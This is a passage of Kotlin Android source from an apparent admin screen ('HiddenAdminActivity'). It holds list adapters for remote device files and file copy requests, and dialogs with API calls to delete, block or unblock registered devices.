                        holder.ivThumbnail.setImageBitmap(bitmap)
                        holder.ivThumbnail.visibility = View.VISIBLE
                        holder.tvIcon.visibility = View.GONE
                    } else {
                        showFallbackIcon(holder, file)
                    }
                } catch (e: Exception) {
                    showFallbackIcon(holder, file)
                }
            } else {
                showFallbackIcon(holder, file)
            }

            holder.itemView.setOnClickListener { onClick(file) }
        }

        private fun showFallbackIcon(holder: ViewHolder, file: DeviceFileDto) {
            holder.ivThumbnail.visibility = View.GONE
            holder.tvIcon.visibility = View.VISIBLE
            holder.tvIcon.text = when (file.category) {
                "IMAGE" -> "🖼️"
                "VIDEO" -> "🎬"
                "AUDIO" -> "🎵"
                "DOCUMENT" -> "📄"
                "APK" -> "📦"
                "ARCHIVE" -> "🗄️"
                else -> "📄"
            }
        }

        override fun getItemCount() = files.size
    }

    inner class CopyRequestAdapter(
        private val requests: List<CopyRequestDto>,
        private val onClick: (CopyRequestDto) -> Unit
    ) : RecyclerView.Adapter<CopyRequestAdapter.ViewHolder>() {

        inner class ViewHolder(view: View) : RecyclerView.ViewHolder(view) {
            val tvName: TextView = view.findViewById(R.id.tvRequestFileName)
            val tvStatus: TextView = view.findViewById(R.id.tvRequestStatus)
            val tvDevice: TextView = view.findViewById(R.id.tvRequestDevice)
            val tvTime: TextView = view.findViewById(R.id.tvRequestTime)
        }

        override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ViewHolder {
            val view = LayoutInflater.from(parent.context).inflate(R.layout.item_copy_request, parent, false)
            return ViewHolder(view)
        }

        override fun onBindViewHolder(holder: ViewHolder, position: Int) {
            val request = requests[position]
            holder.tvName.text = request.fileName
            holder.tvDevice.text = request.device?.let { "📱 ${it.deviceName}" } ?: "📱 Unknown"
            holder.tvTime.text = request.requestedAt.substring(0, 16).replace('T', ' ')

            when (request.status) {
                "PENDING" -> {
                    holder.tvStatus.text = "⏳ Pending"
                    holder.tvStatus.setTextColor(0xFFFFC107.toInt())
                }
                "UPLOADING" -> {
                    holder.tvStatus.text = "⬆️ Uploading"
                    holder.tvStatus.setTextColor(0xFF2196F3.toInt())
                }
                "COMPLETED" -> {
                    holder.tvStatus.text = "✅ Completed"
                    holder.tvStatus.setTextColor(0xFF4CAF50.toInt())
                    holder.itemView.setOnClickListener { onClick(request) }
                }
                "FAILED" -> {
                    holder.tvStatus.text = "❌ Failed"
                    holder.tvStatus.setTextColor(0xFFFF5722.toInt())
                }
                else -> {
                    holder.tvStatus.text = request.status
                }
            }
        }

        override fun getItemCount() = requests.size
    }

    private fun showDeviceActionDialog(device: DeviceDto) {
        val options = mutableListOf("🗑️ Delete Device")
        if (device.status != "BLOCKED") options.add("🚫 Block Device") else options.add("✅ Unblock Device")

        AlertDialog.Builder(this)
            .setTitle("⚙️ ${device.deviceName}")
            .setItems(options.toTypedArray()) { _, which ->
                when {
                    which == 0 -> deleteDevice(device)
                    options[which].contains("Block") && !options[which].contains("Unblock") -> blockDevice(device)
                    options[which].contains("Unblock") -> unblockDevice(device)
                }
            }
            .setNegativeButton("Batal", null)
            .show()
    }

    private fun deleteDevice(device: DeviceDto) {
        AlertDialog.Builder(this)
            .setTitle("🗑️ Hapus Device")
            .setMessage("Hapus device \"${device.deviceName}\" dan semua file records?")
            .setPositiveButton("Hapus") { _, _ ->
                ApiClient.getClient(this).deleteRemoteDevice(device.id).enqueue(object : Callback<BasicResponse> {
                    override fun onResponse(call: Call<BasicResponse>, response: Response<BasicResponse>) {
                        Toast.makeText(this@HiddenAdminActivity, "Device dihapus", Toast.LENGTH_SHORT).show()
                        loadDevices()
                    }
                    override fun onFailure(call: Call<BasicResponse>, t: Throwable) {
                        Toast.makeText(this@HiddenAdminActivity, "Gagal", Toast.LENGTH_SHORT).show()
                    }
                })
            }
            .setNegativeButton("Batal", null)
            .show()
    }

    private fun blockDevice(device: DeviceDto) {
        ApiClient.getClient(this).blockRemoteDevice(device.id).enqueue(object : Callback<Map<String, Any>> {
            override fun onResponse(call: Call<Map<String, Any>>, response: Response<Map<String, Any>>) {
                Toast.makeText(this@HiddenAdminActivity, "Device diblokir", Toast.LENGTH_SHORT).show()
                loadDevices()
            }
            override fun onFailure(call: Call<Map<String, Any>>, t: Throwable) {}
        })
    }

    private fun unblockDevice(device: DeviceDto) {
        ApiClient.getClient(this).unblockRemoteDevice(device.id).enqueue(object : Callback<Map<String, Any>> {
            override fun onResponse(call: Call<Map<String, Any>>, response: Response<Map<String, Any>>) {
                Toast.makeText(this@HiddenAdminActivity, "Device dibuka blokirnya", Toast.LENGTH_SHORT).show()
                loadDevices()
            }
            override fun onFailure(call: Call<Map<String, Any>>, t: Throwable) {}
        })
    }
}
